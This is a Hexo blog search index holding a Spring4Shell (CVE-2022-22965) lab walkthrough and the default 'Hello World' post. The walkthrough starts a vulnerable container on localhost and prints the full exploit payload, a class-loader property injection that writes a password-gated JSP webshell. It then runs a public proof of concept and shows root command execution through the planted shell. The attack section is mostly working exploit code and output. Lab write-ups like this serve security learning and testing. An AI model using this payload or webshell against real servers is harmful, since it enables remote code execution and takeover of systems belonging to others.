<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2022-22965 - Build and Exploit</title>
      <link href="/CVE/cve-2022-22965-build-and-attack/"/>
      <url>/CVE/cve-2022-22965-build-and-attack/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="CVE-2022-22965"><a href="#CVE-2022-22965" class="headerlink" title="CVE-2022-22965"></a>CVE-2022-22965</h2><p>A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.<br>Read more: <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22965" title="link">https://nvd.nist.gov/vuln/detail/CVE-2022-22965</a></p><h2 id="Build-the-application"><a href="#Build-the-application" class="headerlink" title="Build the application"></a>Build the application</h2><p>This docker image contains a Spring Boot web application which is vulnerable to CVE-2022-22965.</p><p>A vulnerable configuration consists of:<br>JDK version 9+<br>Apache Tomcat for serving the application<br>Spring Framework versions 5.3.0 to 5.3.17 and 5.2.0 to 5.2.19 and below<br>application built as a WAR file</p><p>Pull the docker image</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull vulfocus/spring-core-rce-2022-03-29</span><br></pre></td></tr></table></figure><p>Then run the below command to deploy the web app</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --rm --name spring_rce -p 8080:8080 vulfocus/spring-core-rce-2022-03-29</span><br></pre></td></tr></table></figure><p>curl the localhost:8080 to confirm the application is running or not.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://localhost:8080 -v </span><br><span class="line">*   Trying 127.0.0.1:8080...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* Connected to localhost (127.0.0.1) port 8080 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: localhost:8080</span><br><span class="line">&gt; User-Agent: curl/7.68.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 </span><br><span class="line">&lt; Content-Type: text/plain;charset=UTF-8</span><br><span class="line">&lt; Content-Length: 2</span><br><span class="line">&lt; Date: Thu, 07 Apr 2022 12:01:10 GMT</span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host localhost left intact</span></span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Download the exploit script from github. i’m using this : <a href="https://github.com/BobTheShoplifter/Spring4Shell-POC" title="https://github.com/BobTheShoplifter/Spring4Shell-POC">https://github.com/BobTheShoplifter/Spring4Shell-POC</a></p><p>But there is lots of exploit script available for this vulnerability in github.</p><p>Here is the payload used in this python script</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(self.url,</span><br><span class="line">                          headers=headers,</span><br><span class="line">                          data=data,</span><br><span class="line">                          timeout=<span class="number">15</span>,</span><br><span class="line">                          allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                          verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>run this command to inject the webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $ git <span class="built_in">clone</span> https://github.com/BobTheShoplifter/Spring4Shell-POC.git</span><br><span class="line">Cloning into <span class="string">&#x27;Spring4Shell-POC&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 297, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (297/297), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (245/245), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 297 (delta 100), reused 109 (delta 27), pack-reused 0</span><br><span class="line">Receiving objects: 100% (297/297), 16.45 MiB | 7.90 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (100/100), <span class="keyword">done</span>.</span><br><span class="line">$ <span class="built_in">cd</span> Spring4Shell-POC/</span><br><span class="line">$ <span class="built_in">chmod</span> +x poc.py </span><br><span class="line">$ ./poc.py  --url http://localhost:8080/</span><br><span class="line">Vulnerable，shell url: http://localhost:8080/tomcatwar.jsp?<span class="built_in">pwd</span>=j&amp;cmd=<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>the script successfully injected the webshell in the server.</p><p>just curl the url : <strong><a href="http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id">http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id</a></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id&#x27;</span> --output -</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">- <span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = -.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -</span><br><span class="line">- <span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = -.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -</span><br><span class="line">- <span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = -.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -</span><br><span class="line">- <span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = -.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -</span><br><span class="line">- <span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123; java.io.InputStream <span class="keyword">in</span> = -.getRuntime().<span class="built_in">exec</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); int a = -1; byte[] b = new byte[2048]; <span class="keyword">while</span>((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; -</span><br></pre></td></tr></table></figure><p>Reference: <a href="https://github.com/itsecurityco/CVE-2022-22965" title="https://github.com/itsecurityco/CVE-2022-22965">https://github.com/itsecurityco/CVE-2022-22965</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring-core </tag>
            
            <tag> java </tag>
            
            <tag> CVE-2022-22965 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/hello-world/"/>
      <url>/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a><a href="" title="Download File">Download File</a><br><img src="/uploads/avatar.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@requires_authorization(<span class="params">roles=[<span class="string">&quot;ADMIN&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">somefunc</span>(<span class="params">param1=<span class="string">&#x27;&#x27;</span>, param2=<span class="number">0</span></span>):</span><br><span class="line">    <span class="string">r&#x27;&#x27;&#x27;A docstring&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> param1 &gt; param2: <span class="comment"># interesting</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Gre\&#x27;ater&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> (param2 - param1 + <span class="number">1</span> + <span class="number">0b10l</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SomeClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = <span class="string">&#x27;&#x27;&#x27;interpreter</span></span><br><span class="line"><span class="string"><span class="meta">... </span>prompt&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
